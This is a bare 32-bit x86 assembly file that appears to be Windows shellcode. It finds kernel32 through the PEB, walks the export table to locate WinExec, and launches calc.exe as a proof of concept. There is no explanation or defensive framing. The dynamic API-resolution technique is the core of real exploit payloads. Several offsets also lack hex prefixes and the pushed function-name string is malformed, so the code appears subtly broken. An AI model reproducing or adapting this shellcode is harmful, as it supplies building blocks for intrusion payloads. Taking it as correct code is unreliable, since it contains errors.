BITS 32
SECTION .text
global main

main:
push eax 
        push ebx
        push ecx
        push edx
        push esi
        push edi
        push ebp


	push ebp
	mov ebp, esp

	sub esp, 18		

	xor esi, esi
	push esi			
	push 0x63
	push 0x6578
	push 0x456e6957
	mov [ebp-4], esp 		


	xor esi, esi			
        mov ebx, [fs:30 + esi]  	
	mov ebx, [ebx + 0x0C] 
	mov ebx, [ebx + 0x14] 
	mov ebx, [ebx]	
	mov ebx, [ebx]	
	mov ebx, [ebx + 0x10]		
	mov [ebp-8], ebx 		


	mov eax, [ebx + 3C]		
	add eax, ebx       		
	mov eax, [eax + 78]		
	add eax, ebx 			

	mov ecx, [eax + 24]		
	add ecx, ebx 			
	mov [ebp-0C], ecx 		

	mov edi, [eax + 20] 		
	add edi, ebx 			
	mov [ebp-10], edi 		

	mov edx, [eax + 1C] 		
	add edx, ebx 			
	mov [ebp-14], edx 		

	mov edx, [eax + 14] 		

	xor eax, eax 			

	loop:
	        mov edi, [ebp-0x10] 	
	        mov esi, [ebp-4] 	
	        xor ecx, ecx

	        cld  			
	        mov edi, [edi + eax*4]	
	        			
	        add edi, ebx       	
	        add cx, 8 		
	        repe cmpsb        	
	        			
	        jz found

	        inc eax 		
	        cmp eax, edx    	
	        jb loop 		

	        add esp, 0x26   		
	        jmp end 		

	found:
		

	        mov ecx, [ebp-0x0C]	
	        mov edx, [ebp-0x14]  	

	        mov ax, [ecx + eax*2] 	
	        mov eax, [edx + eax*4] 	
	        add eax, ebx 		
	        			

	        xor edx, edx
		push edx		
		push 0x6578652e
		push 0x636c6163
		push 0x5c32336d
		push 0x65747379
		push 0x535c7377
		push 0x6f646e69
		push 0x575c3a43
		mov esi, esp		

		push 0x10  		
		push esi 		
		call eax 		

		add esp, 46		

	end:
		
		pop ebp 		
		pop edi
		pop esi
		pop edx
		pop ecx
		pop ebx
		pop eax
		ret